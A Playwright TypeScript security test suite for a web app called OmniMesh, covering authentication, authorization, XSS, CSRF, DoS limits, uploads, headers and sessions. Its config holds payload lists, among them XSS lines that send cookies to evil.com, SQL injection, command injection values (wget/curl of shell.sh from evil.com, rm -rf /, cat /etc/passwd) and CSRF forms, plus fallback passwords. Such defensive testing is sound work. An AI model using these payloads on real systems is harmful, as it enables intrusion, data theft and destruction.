// Security Test Suite for OmniMesh - Complete Coverage
// Addresses all Tiger Lily audit findings with comprehensive testing

import { test, expect } from '@playwright/test';
import { chromium, firefox, webkit } from '@playwright/test';
import crypto from 'crypto';

// Test configuration
const SECURITY_CONFIG = {
  BASE_URL: process.env.TEST_URL || 'https://omnimesh.local',
  API_URL: process.env.API_URL || 'https://api.omnimesh.local',
  ADMIN_USERNAME: process.env.ADMIN_USERNAME || 'admin',
  ADMIN_PASSWORD: process.env.ADMIN_PASSWORD || 'SecureP@ssw0rd123!',
  TEST_USERNAME: process.env.TEST_USERNAME || 'testuser',
  TEST_PASSWORD: process.env.TEST_PASSWORD || 'TestP@ssw0rd123!',
  RATE_LIMIT_THRESHOLD: 10,
  SESSION_TIMEOUT: 900000, // 15 minutes
  MAX_NODES: 1000,
  MAX_EDGES: 2000,
  MEMORY_LIMIT: 100 * 1024 * 1024, // 100MB
  EXECUTION_TIMEOUT: 30000, // 30 seconds
  XSS_PAYLOADS: [
    '<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    'javascript:alert("XSS")',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<object data="javascript:alert(\'XSS\')">',
    '<embed src="javascript:alert(\'XSS\')">',
    '<script>fetch("http://evil.com/steal?data="+document.cookie)</script>',
    '<img src=x onerror=fetch("http://evil.com/steal?data="+localStorage.getItem("session"))>',
    '"><script>document.location="http://evil.com/steal?data="+document.cookie</script>',
    '<svg><script>alert("XSS")</script></svg>',
    '<math><script>alert("XSS")</script></math>',
    '<video><source onerror="alert(\'XSS\')">',
    '<audio src=x onerror=alert("XSS")>',
    '<details open ontoggle=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '<select onfocus=alert("XSS") autofocus>',
    '<textarea onfocus=alert("XSS") autofocus>',
    '<keygen onfocus=alert("XSS") autofocus>',
    '<body onload=alert("XSS")>',
    '<div onmouseover=alert("XSS")>',
    '<span onclick=alert("XSS")>',
    '<a href="javascript:alert(\'XSS\')">',
    '<form action="javascript:alert(\'XSS\')">',
    '<button onclick=alert("XSS")>',
    '<input type="button" onclick=alert("XSS")>',
    '<input type="image" onclick=alert("XSS")>',
    '<input type="submit" onclick=alert("XSS")>',
    '<input type="reset" onclick=alert("XSS")>',
    '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
    '<style>@import "javascript:alert(\'XSS\')";</style>',
    '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
    '<base href="javascript:alert(\'XSS\')">',
    '<applet code="javascript:alert(\'XSS\')">',
    '<bgsound src="javascript:alert(\'XSS\')">',
    '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">',
    '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">',
    '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">',
    '<frameset onload=alert("XSS")>',
    '<xml id="X"><script>alert("XSS")</script></xml>',
    '<div datafld="X" dataformatas="html" datasrc="#X">',
    '<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert("XSS")</x:script>',
    '<?xml version="1.0"?><script>alert("XSS")</script>',
    '<html xmlns="http://www.w3.org/1999/xhtml"><script>alert("XSS")</script></html>',
    '<![CDATA[<script>alert("XSS")</script>]]>',
    '<html><head><script>alert("XSS")</script></head></html>',
    '<html><body><script>alert("XSS")</script></body></html>'
  ],
  SQLI_PAYLOADS: [
    "'; DROP TABLE users; --",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "' OR 1=1 /*",
    "' UNION SELECT null, null, null --",
    "' UNION SELECT username, password FROM users --",
    "admin'--",
    "admin'/*",
    "' OR 'a'='a",
    "' OR 'a'='a'--",
    "' OR 'a'='a'/*",
    "') OR ('a'='a",
    "') OR ('a'='a'--",
    "') OR ('a'='a'/*",
    "1' OR '1'='1",
    "1' OR '1'='1'--",
    "1' OR '1'='1'/*",
    "1') OR ('1'='1",
    "1') OR ('1'='1'--",
    "1') OR ('1'='1'/*"
  ],
  COMMAND_INJECTION_PAYLOADS: [
    "; cat /etc/passwd",
    "& cat /etc/passwd",
    "| cat /etc/passwd",
    "; ls -la",
    "& ls -la",
    "| ls -la",
    "; whoami",
    "& whoami",
    "| whoami",
    "; id",
    "& id",
    "| id",
    "; uname -a",
    "& uname -a",
    "| uname -a",
    "; ps aux",
    "& ps aux",
    "| ps aux",
    "; netstat -an",
    "& netstat -an",
    "| netstat -an",
    "; wget http://evil.com/shell.sh",
    "& wget http://evil.com/shell.sh",
    "| wget http://evil.com/shell.sh",
    "; curl http://evil.com/shell.sh",
    "& curl http://evil.com/shell.sh",
    "| curl http://evil.com/shell.sh",
    "; rm -rf /",
    "& rm -rf /",
    "| rm -rf /",
    "; shutdown -h now",
    "& shutdown -h now",
    "| shutdown -h now"
  ],
  CSRF_PAYLOADS: [
    '<form action="/api/admin/delete-user" method="POST"><input type="hidden" name="userId" value="admin"><input type="submit" value="Click me"></form>',
    '<img src="/api/admin/delete-user?userId=admin" style="display:none">',
    '<iframe src="/api/admin/delete-user?userId=admin" style="display:none"></iframe>',
    '<script>fetch("/api/admin/delete-user", {method: "POST", body: "userId=admin"})</script>',
    '<link rel="stylesheet" href="/api/admin/delete-user?userId=admin">',
    '<object data="/api/admin/delete-user?userId=admin"></object>',
    '<embed src="/api/admin/delete-user?userId=admin">',
    '<video src="/api/admin/delete-user?userId=admin"></video>',
    '<audio src="/api/admin/delete-user?userId=admin"></audio>',
    '<source src="/api/admin/delete-user?userId=admin">'
  ]
};

// Utility functions
const generateRandomString = (length: number = 10) => {
  return crypto.randomBytes(length).toString('hex');
};

const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

const createMaliciousPayload = (type: 'xss' | 'sql' | 'command' | 'csrf') => {
  const payloads = {
    xss: SECURITY_CONFIG.XSS_PAYLOADS,
    sql: SECURITY_CONFIG.SQLI_PAYLOADS,
    command: SECURITY_CONFIG.COMMAND_INJECTION_PAYLOADS,
    csrf: SECURITY_CONFIG.CSRF_PAYLOADS
  };
  
  const payload = payloads[type];
  return payload[Math.floor(Math.random() * payload.length)];
};

// Test setup and teardown
test.beforeEach(async ({ page }) => {
  // Set up security monitoring
  await page.route('**/api/security/audit', route => {
    route.fulfill({
      status: 200,
      body: JSON.stringify({ success: true })
    });
  });
  
  // Set up CSP violation monitoring
  page.on('pageerror', error => {
    if (error.message.includes('Content Security Policy')) {
      console.log('CSP Violation detected:', error.message);
    }
  });
  
  // Set up request monitoring
  page.on('request', request => {
    const url = request.url();
    const method = request.method();
    
    // Log suspicious requests
    if (url.includes('javascript:') || url.includes('data:text/html')) {
      console.log('Suspicious request detected:', method, url);
    }
  });
});

test.afterEach(async ({ page }) => {
  // Clean up any test artifacts
  await page.evaluate(() => {
    localStorage.clear();
    sessionStorage.clear();
  });
  
  // Clear any cookies
  await page.context().clearCookies();
});

// Authentication Security Tests
test.describe('Authentication Security Tests', () => {
  test('should reject invalid credentials with proper error handling', async ({ page }) => {
    await page.goto(SECURITY_CONFIG.BASE_URL + '/login');
    
    // Test various invalid credential combinations
    const invalidCredentials = [
      { username: '', password: '' },
      { username: 'admin', password: 'wrong' },
      { username: 'nonexistent', password: 'password' },
      { username: 'admin', password: '' },
      { username: '', password: 'password' }
    ];
    
    for (const cred of invalidCredentials) {
      await page.fill('[data-testid="username"]', cred.username);
      await page.fill('[data-testid="password"]', cred.password);
      await page.click('[data-testid="login-button"]');
      
      // Should show error message
      await expect(page.locator('[data-testid="error-message"]')).toBeVisible();
      
      // Should not be redirected
      expect(page.url()).toContain('/login');
      
      // Clear fields for next test
      await page.fill('[data-testid="username"]', '');
      await page.fill('[data-testid="password"]', '');
    }
  });

  test('should enforce rate limiting on login attempts', async ({ page }) => {
    await page.goto(SECURITY_CONFIG.BASE_URL + '/login');
    
    // Attempt multiple failed logins rapidly
    for (let i = 0; i < SECURITY_CONFIG.RATE_LIMIT_THRESHOLD + 5; i++) {
      await page.fill('[data-testid="username"]', 'testuser');
      await page.fill('[data-testid="password"]', `wrong-password-${i}`);
      await page.click('[data-testid="login-button"]');
      
      if (i < SECURITY_CONFIG.RATE_LIMIT_THRESHOLD) {
        await expect(page.locator('[data-testid="error-message"]')).toBeVisible();
      }
    }
    
    // Should be rate limited
    await expect(page.locator('[data-testid="rate-limit-message"]')).toBeVisible();
    await expect(page.locator('[data-testid="login-button"]')).toBeDisabled();
  });

  test('should require MFA for admin users', async ({ page }) => {
    await page.goto(SECURITY_CONFIG.BASE_URL + '/login');
    
    // Login with admin credentials
    await page.fill('[data-testid="username"]', SECURITY_CONFIG.ADMIN_USERNAME);
    await page.fill('[data-testid="password"]', SECURITY_CONFIG.ADMIN_PASSWORD);
    await page.click('[data-testid="login-button"]');
    
    // Should prompt for MFA
    await expect(page.locator('[data-testid="mfa-prompt"]')).toBeVisible();
    await expect(page.locator('[data-testid="mfa-input"]')).toBeVisible();
    
    // Should not be fully authenticated yet
    expect(page.url()).toContain('/mfa');
  });

  test('should prevent credential stuffing attacks', async ({ page }) => {
    const commonCredentials = [
      ['admin', 'admin'],
      ['admin', 'password'],
      ['root', 'root'],
      ['user', 'user'],
      ['test', 'test'],
      ['guest', 'guest'],
      ['administrator', 'administrator'],
      ['admin', '123456'],
      ['admin', 'admin123'],
      ['root', 'password']
    ];
    
    await page.goto(SECURITY_CONFIG.BASE_URL + '/login');
    
    for (const [username, password] of commonCredentials) {
      await page.fill('[data-testid="username"]', username);
      await page.fill('[data-testid="password"]', password);
      await page.click('[data-testid="login-button"]');
      
      // Should reject all common credentials
      await expect(page.locator('[data-testid="error-message"]')).toBeVisible();
      
      // Add delay to avoid overwhelming the system
      await sleep(1000);
    }
    
    // Should eventually be rate limited
    await expect(page.locator('[data-testid="rate-limit-message"]')).toBeVisible();
  });

  test('should validate session security', async ({ page }) => {
    // Login with valid credentials
    await page.goto(SECURITY_CONFIG.BASE_URL + '/login');
    await page.fill('[data-testid="username"]', SECURITY_CONFIG.TEST_USERNAME);
    await page.fill('[data-testid="password"]', SECURITY_CONFIG.TEST_PASSWORD);
    await page.click('[data-testid="login-button"]');
    await expect(page.locator('[data-testid="dashboard"]')).toBeVisible();
    
    // Check session properties
    const sessionData = await page.evaluate(() => {
      const session = JSON.parse(localStorage.getItem('session') || '{}');
      return {
        hasToken: !!session.accessToken,
        hasRefreshToken: !!session.refreshToken,
        hasCsrfToken: !!session.csrfToken,
        hasExpiry: !!session.sessionExpiry,
        tokenFormat: session.accessToken ? session.accessToken.split('.').length : 0
      };
    });
    
    expect(sessionData.hasToken).toBe(true);
    expect(sessionData.hasRefreshToken).toBe(true);
    expect(sessionData.hasCsrfToken).toBe(true);
    expect(sessionData.hasExpiry).toBe(true);
    expect(sessionData.tokenFormat).toBe(3); // JWT format
  });

  test('should handle session timeout properly', async ({ page }) => {
    // Login with valid credentials
    await page.goto(SECURITY_CONFIG.BASE_URL + '/login');
    await page.fill('[data-testid="username"]', SECURITY_CONFIG.TEST_USERNAME);
    await page.fill('[data-testid="password"]', SECURITY_CONFIG.TEST_PASSWORD);
    await page.click('[data-testid="login-button"]');
    await expect(page.locator('[data-testid="dashboard"]')).toBeVisible();
    
    // Simulate session timeout by manipulating session data
    await page.evaluate((timeout) => {
      const session = JSON.parse(localStorage.getItem('session') || '{}');
      session.sessionExpiry = Date.now() - 1000; // Expired 1 second ago
      session.lastActivity = Date.now() - timeout - 1000; // Beyond timeout
      localStorage.setItem('session', JSON.stringify(session));
    }, SECURITY_CONFIG.SESSION_TIMEOUT);
    
    // Navigate to a protected page
    await page.goto(SECURITY_CONFIG.BASE_URL + '/dashboard');
    
    // Should redirect to login
    await expect(page.locator('[data-testid="login-form"]')).toBeVisible();
  });
});

// Authorization Security Tests
test.describe('Authorization Security Tests', () => {
  test.beforeEach(async ({ page }) => {
    // Login as regular user
    await page.goto(SECURITY_CONFIG.BASE_URL + '/login');
    await page.fill('[data-testid="username"]', SECURITY_CONFIG.TEST_USERNAME);
    await page.fill('[data-testid="password"]', SECURITY_CONFIG.TEST_PASSWORD);
    await page.click('[data-testid="login-button"]');
    await expect(page.locator('[data-testid="dashboard"]')).toBeVisible();
  });

  test('should prevent privilege escalation', async ({ page }) => {
    // Attempt to access admin-only functionality
    await page.goto(SECURITY_CONFIG.BASE_URL + '/admin/users');
    
    // Should be denied access
    await expect(page.locator('[data-testid="access-denied"]')).toBeVisible();
    await expect(page.locator('[data-testid="access-denied"]')).toContainText('Insufficient permissions');
  });

  test('should validate permissions for API calls', async ({ page }) => {
    // Intercept API calls
    const unauthorizedCalls: string[] = [];
    
    page.on('response', response => {
      if (response.status() === 403) {
        unauthorizedCalls.push(response.url());
      }
    });
    
    // Attempt to call admin API endpoints
    await page.evaluate(async (apiUrl) => {
      const adminEndpoints = [
        '/api/admin/users',
        '/api/admin/settings',
        '/api/admin/security',
        '/api/admin/logs',
        '/api/admin/system',
        '/api/admin/backup',
        '/api/admin/restore'
      ];
      
      for (const endpoint of adminEndpoints) {
        try {
          await fetch(`${apiUrl}${endpoint}`, {
            method: 'GET',
            credentials: 'include',
          });
        } catch (error) {
          // Expected to fail
        }
      }
    }, SECURITY_CONFIG.API_URL);
    
    // Should have received 403 responses
    expect(unauthorizedCalls.length).toBeGreaterThan(0);
  });

  test('should enforce namespace isolation', async ({ page }) => {
    // Attempt to access resources from unauthorized namespace
    const response = await page.request.get(`${SECURITY_CONFIG.API_URL}/api/namespaces/kube-system/pods`);
    expect(response.status()).toBe(403);
  });
});

// XSS Protection Tests
test.describe('XSS Protection Tests', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto(SECURITY_CONFIG.BASE_URL + '/login');
    await page.fill('[data-testid="username"]', SECURITY_CONFIG.TEST_USERNAME);
    await page.fill('[data-testid="password"]', SECURITY_CONFIG.TEST_PASSWORD);
    await page.click('[data-testid="login-button"]');
    await expect(page.locator('[data-testid="dashboard"]')).toBeVisible();
  });

  test('should sanitize user input in search fields', async ({ page }) => {
    await page.goto(SECURITY_CONFIG.BASE_URL + '/search');
    
    // Test multiple XSS payloads
    for (const payload of SECURITY_CONFIG.XSS_PAYLOADS.slice(0, 10)) {
      await page.fill('[data-testid="search-input"]', payload);
      await page.click('[data-testid="search-button"]');
      
      // Check that script didn't execute
      const alerts: string[] = [];
      page.on('dialog', dialog => {
        alerts.push(dialog.message());
        dialog.dismiss();
      });
      
      await sleep(1000);
      expect(alerts).toHaveLength(0);
      
      // Check that input was sanitized
      const searchValue = await page.inputValue('[data-testid="search-input"]');
      expect(searchValue).not.toContain('<script>');
      expect(searchValue).not.toContain('javascript:');
    }
  });

  test('should prevent DOM-based XSS', async ({ page }) => {
    // Test URL parameters
    const xssUrl = `${SECURITY_CONFIG.BASE_URL}/dashboard?name=${encodeURIComponent('<script>alert("XSS")</script>')}`;
    await page.goto(xssUrl);
    
    // Check that script didn't execute
    const alerts: string[] = [];
    page.on('dialog', dialog => {
      alerts.push(dialog.message());
      dialog.dismiss();
    });
    
    await sleep(2000);
    expect(alerts).toHaveLength(0);
  });

  test('should sanitize data in FabricMap component', async ({ page }) => {
    await page.goto(SECURITY_CONFIG.BASE_URL + '/fabric-map');
    
    // Inject malicious node data
    await page.evaluate((xssPayload) => {
      const maliciousNode = {
        id: 'malicious',
        name: xssPayload,
        description: '<img src=x onerror=alert("XSS")>',
        metadata: {
          label: 'javascript:alert("XSS")'
        }
      };
      
      // Simulate adding malicious node
      window.postMessage({
        type: 'ADD_NODE',
        data: maliciousNode
      }, '*');
    }, SECURITY_CONFIG.XSS_PAYLOADS[0]);
    
    await sleep(2000);
    
    // Check that no alerts were triggered
    const alerts: string[] = [];
    page.on('dialog', dialog => {
      alerts.push(dialog.message());
      dialog.dismiss();
    });
    
    expect(alerts).toHaveLength(0);
  });
});

// CSRF Protection Tests
test.describe('CSRF Protection Tests', () => {
  test('should include CSRF token in forms', async ({ page }) => {
    await page.goto(SECURITY_CONFIG.BASE_URL + '/login');
    await page.fill('[data-testid="username"]', SECURITY_CONFIG.TEST_USERNAME);
    await page.fill('[data-testid="password"]', SECURITY_CONFIG.TEST_PASSWORD);
    await page.click('[data-testid="login-button"]');
    await expect(page.locator('[data-testid="dashboard"]')).toBeVisible();
    
    // Navigate to a form page
    await page.goto(SECURITY_CONFIG.BASE_URL + '/settings');
    
    // Check for CSRF token
    const csrfToken = await page.locator('input[name="csrf_token"]').getAttribute('value');
    expect(csrfToken).toBeTruthy();
    expect(csrfToken!.length).toBeGreaterThan(16);
  });

  test('should reject requests without valid CSRF token', async ({ page }) => {
    await page.goto(SECURITY_CONFIG.BASE_URL + '/login');
    await page.fill('[data-testid="username"]', SECURITY_CONFIG.TEST_USERNAME);
    await page.fill('[data-testid="password"]', SECURITY_CONFIG.TEST_PASSWORD);
    await page.click('[data-testid="login-button"]');
    await expect(page.locator('[data-testid="dashboard"]')).toBeVisible();
    
    // Make API request without CSRF token
    const response = await page.request.post(`${SECURITY_CONFIG.API_URL}/api/settings`, {
      data: { key: 'value' }
    });
    
    expect(response.status()).toBe(403);
  });
});

// Performance DoS Protection Tests
test.describe('Performance DoS Protection Tests', () => {
  test('should limit FabricMap node rendering', async ({ page }) => {
    await page.goto(SECURITY_CONFIG.BASE_URL + '/login');
    await page.fill('[data-testid="username"]', SECURITY_CONFIG.TEST_USERNAME);
    await page.fill('[data-testid="password"]', SECURITY_CONFIG.TEST_PASSWORD);
    await page.click('[data-testid="login-button"]');
    await expect(page.locator('[data-testid="dashboard"]')).toBeVisible();
    
    await page.goto(SECURITY_CONFIG.BASE_URL + '/fabric-map');
    
    // Monitor memory usage
    const memoryBefore = await page.evaluate(() => {
      return (performance as any).memory ? (performance as any).memory.usedJSHeapSize : 0;
    });
    
    // Generate large dataset
    await page.evaluate((config) => {
      const largeDataset = Array.from({ length: config.MAX_NODES * 2 }, (_, i) => ({
        id: `stress-node-${i}`,
        x: Math.random() * 2000,
        y: Math.random() * 2000,
        status: 'active',
        name: `Stress Node ${i}`,
        connections: Array.from({ length: 10 }, (_, j) => `stress-node-${(i + j) % (config.MAX_NODES * 2)}`)
      }));
      
      // Simulate data update
      window.postMessage({
        type: 'UPDATE_NODES',
        data: largeDataset
      }, '*');
    }, SECURITY_CONFIG);
    
    await sleep(5000);
    
    // Check memory usage
    const memoryAfter = await page.evaluate(() => {
      return (performance as any).memory ? (performance as any).memory.usedJSHeapSize : 0;
    });
    
    // Should not exceed memory limit
    const memoryIncrease = memoryAfter - memoryBefore;
    expect(memoryIncrease).toBeLessThan(SECURITY_CONFIG.MEMORY_LIMIT);
    
    // Check that node count is limited
    const nodeCount = await page.locator('[data-testid="fabric-node"]').count();
    expect(nodeCount).toBeLessThanOrEqual(SECURITY_CONFIG.MAX_NODES);
  });

  test('should prevent infinite loops in MindForge', async ({ page }) => {
    await page.goto(SECURITY_CONFIG.BASE_URL + '/login');
    await page.fill('[data-testid="username"]', SECURITY_CONFIG.TEST_USERNAME);
    await page.fill('[data-testid="password"]', SECURITY_CONFIG.TEST_PASSWORD);
    await page.click('[data-testid="login-button"]');
    await expect(page.locator('[data-testid="dashboard"]')).toBeVisible();
    
    await page.goto(SECURITY_CONFIG.BASE_URL + '/mindforge');
    
    // Create a workflow with potential infinite loop
    await page.evaluate(() => {
      const workflow = {
        nodes: [
          { id: 'start', type: 'input' },
          { id: 'loop', type: 'loop', properties: { maxIterations: 1000000 } },
          { id: 'end', type: 'output' }
        ],
        edges: [
          { from: { nodeId: 'start' }, to: { nodeId: 'loop' } },
          { from: { nodeId: 'loop' }, to: { nodeId: 'loop' } }, // Self-loop
          { from: { nodeId: 'loop' }, to: { nodeId: 'end' } }
        ]
      };
      
      window.postMessage({
        type: 'LOAD_WORKFLOW',
        data: workflow
      }, '*');
    });
    
    await sleep(1000);
    
    // Try to execute the workflow
    await page.click('[data-testid="execute-workflow"]');
    
    // Should timeout within reasonable time
    const startTime = Date.now();
    await page.waitForSelector('[data-testid="execution-status"]', { timeout: SECURITY_CONFIG.EXECUTION_TIMEOUT });
    const executionTime = Date.now() - startTime;
    
    expect(executionTime).toBeLessThan(SECURITY_CONFIG.EXECUTION_TIMEOUT);
    
    // Check execution status
    const status = await page.locator('[data-testid="execution-status"]').textContent();
    expect(status).toMatch(/(timeout|blocked|failed)/i);
  });

  test('should enforce API rate limiting', async ({ page }) => {
    await page.goto(SECURITY_CONFIG.BASE_URL + '/login');
    await page.fill('[data-testid="username"]', SECURITY_CONFIG.TEST_USERNAME);
    await page.fill('[data-testid="password"]', SECURITY_CONFIG.TEST_PASSWORD);
    await page.click('[data-testid="login-button"]');
    await expect(page.locator('[data-testid="dashboard"]')).toBeVisible();
    
    // Make rapid API requests
    const responses = await Promise.all(
      Array.from({ length: 50 }, () => 
        page.request.get(`${SECURITY_CONFIG.API_URL}/api/nodes`)
      )
    );
    
    // Should have some rate-limited responses
    const rateLimitedResponses = responses.filter(r => r.status() === 429);
    expect(rateLimitedResponses.length).toBeGreaterThan(0);
  });
});

// Data Validation Tests
test.describe('Data Validation Tests', () => {
  test('should validate input lengths', async ({ page }) => {
    await page.goto(SECURITY_CONFIG.BASE_URL + '/login');
    await page.fill('[data-testid="username"]', SECURITY_CONFIG.TEST_USERNAME);
    await page.fill('[data-testid="password"]', SECURITY_CONFIG.TEST_PASSWORD);
    await page.click('[data-testid="login-button"]');
    await expect(page.locator('[data-testid="dashboard"]')).toBeVisible();
    
    await page.goto(SECURITY_CONFIG.BASE_URL + '/settings');
    
    // Test extremely long input
    const longInput = 'A'.repeat(100000);
    await page.fill('[data-testid="description-input"]', longInput);
    await page.click('[data-testid="save-button"]');
    
    // Should show validation error
    await expect(page.locator('[data-testid="validation-error"]')).toBeVisible();
    await expect(page.locator('[data-testid="validation-error"]')).toContainText('too long');
  });

  test('should validate file uploads', async ({ page }) => {
    await page.goto(SECURITY_CONFIG.BASE_URL + '/login');
    await page.fill('[data-testid="username"]', SECURITY_CONFIG.TEST_USERNAME);
    await page.fill('[data-testid="password"]', SECURITY_CONFIG.TEST_PASSWORD);
    await page.click('[data-testid="login-button"]');
    await expect(page.locator('[data-testid="dashboard"]')).toBeVisible();
    
    await page.goto(SECURITY_CONFIG.BASE_URL + '/upload');
    
    // Test malicious file types
    const maliciousFiles = [
      'malware.exe',
      'script.js',
      'config.php',
      'shell.sh',
      'backdoor.jsp',
      'virus.bat',
      'trojan.com',
      'rootkit.bin'
    ];
    
    for (const fileName of maliciousFiles) {
      // Create a temporary file
      const buffer = Buffer.from('malicious content');
      
      await page.setInputFiles('[data-testid="file-input"]', {
        name: fileName,
        buffer: buffer,
        mimeType: 'application/octet-stream'
      });
      
      await page.click('[data-testid="upload-button"]');
      
      // Should reject malicious files
      await expect(page.locator('[data-testid="upload-error"]')).toBeVisible();
      await expect(page.locator('[data-testid="upload-error"]')).toContainText('not allowed');
    }
  });
});

// Security Headers Tests
test.describe('Security Headers Tests', () => {
  test('should include proper security headers', async ({ page }) => {
    const response = await page.goto(SECURITY_CONFIG.BASE_URL);
    
    // Check for security headers
    const headers = response?.headers();
    expect(headers).toBeDefined();
    
    if (headers) {
      expect(headers['x-content-type-options']).toBe('nosniff');
      expect(headers['x-frame-options']).toBe('DENY');
      expect(headers['x-xss-protection']).toBe('1; mode=block');
      expect(headers['referrer-policy']).toBe('strict-origin-when-cross-origin');
      expect(headers['content-security-policy']).toBeDefined();
      expect(headers['strict-transport-security']).toBeDefined();
    }
  });

  test('should enforce Content Security Policy', async ({ page }) => {
    await page.goto(SECURITY_CONFIG.BASE_URL);
    
    // Check CSP header
    const response = await page.goto(SECURITY_CONFIG.BASE_URL);
    const csp = response?.headers()['content-security-policy'];
    
    expect(csp).toBeDefined();
    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("script-src 'self'");
    expect(csp).toContain("style-src 'self'");
    expect(csp).toContain("img-src 'self'");
    expect(csp).not.toContain("'unsafe-eval'");
    expect(csp).not.toContain("'unsafe-inline'");
  });
});

// Session Management Tests
test.describe('Session Management Tests', () => {
  test('should invalidate session on logout', async ({ page }) => {
    await page.goto(SECURITY_CONFIG.BASE_URL + '/login');
    await page.fill('[data-testid="username"]', SECURITY_CONFIG.TEST_USERNAME);
    await page.fill('[data-testid="password"]', SECURITY_CONFIG.TEST_PASSWORD);
    await page.click('[data-testid="login-button"]');
    await expect(page.locator('[data-testid="dashboard"]')).toBeVisible();
    
    // Get session ID
    const sessionId = await page.evaluate(() => {
      const session = JSON.parse(localStorage.getItem('session') || '{}');
      return session.id;
    });
    
    // Logout
    await page.click('[data-testid="logout-button"]');
    await expect(page.locator('[data-testid="login-form"]')).toBeVisible();
    
    // Try to use old session
    const response = await page.request.get(`${SECURITY_CONFIG.API_URL}/api/user`, {
      headers: {
        'Authorization': `Bearer ${sessionId}`
      }
    });
    
    expect(response.status()).toBe(401);
  });

  test('should handle concurrent sessions properly', async ({ browser }) => {
    const context1 = await browser.newContext();
    const context2 = await browser.newContext();
    
    const page1 = await context1.newPage();
    const page2 = await context2.newPage();
    
    // Login with same user in both contexts
    for (const page of [page1, page2]) {
      await page.goto(SECURITY_CONFIG.BASE_URL + '/login');
      await page.fill('[data-testid="username"]', SECURITY_CONFIG.TEST_USERNAME);
      await page.fill('[data-testid="password"]', SECURITY_CONFIG.TEST_PASSWORD);
      await page.click('[data-testid="login-button"]');
      await expect(page.locator('[data-testid="dashboard"]')).toBeVisible();
    }
    
    // Logout from one session
    await page1.click('[data-testid="logout-button"]');
    await expect(page1.locator('[data-testid="login-form"]')).toBeVisible();
    
    // Other session should still be valid
    await page2.reload();
    await expect(page2.locator('[data-testid="dashboard"]')).toBeVisible();
    
    await context1.close();
    await context2.close();
  });
});

// Test cleanup
test.afterEach(async ({ page }) => {
  // Clear any remaining alerts
  page.removeAllListeners('dialog');
  
  // Clear localStorage
  await page.evaluate(() => {
    localStorage.clear();
    sessionStorage.clear();
  });
});

// Cross-browser security tests
test.describe('Cross-browser Security Tests', () => {
  ['chromium', 'firefox', 'webkit'].forEach(browserName => {
    test(`should maintain security across ${browserName}`, async () => {
      const browser = await (browserName === 'chromium' ? chromium : 
                            browserName === 'firefox' ? firefox : webkit).launch();
      const page = await browser.newPage();
      
      try {
        await page.goto(SECURITY_CONFIG.BASE_URL + '/login');
        await page.fill('[data-testid="username"]', SECURITY_CONFIG.TEST_USERNAME);
        await page.fill('[data-testid="password"]', SECURITY_CONFIG.TEST_PASSWORD);
        await page.click('[data-testid="login-button"]');
        await expect(page.locator('[data-testid="dashboard"]')).toBeVisible();
        
        // Test XSS protection
        await page.goto(SECURITY_CONFIG.BASE_URL + '/search');
        await page.fill('[data-testid="search-input"]', '<script>alert("XSS")</script>');
        await page.click('[data-testid="search-button"]');
        
        // Should not execute script
        const alerts: string[] = [];
        page.on('dialog', dialog => {
          alerts.push(dialog.message());
          dialog.dismiss();
        });
        
        await sleep(2000);
        expect(alerts).toHaveLength(0);
        
      } finally {
        await browser.close();
      }
    });
  });
});

// Export test configuration for external use
export { SECURITY_CONFIG, generateRandomString, createMaliciousPayload };
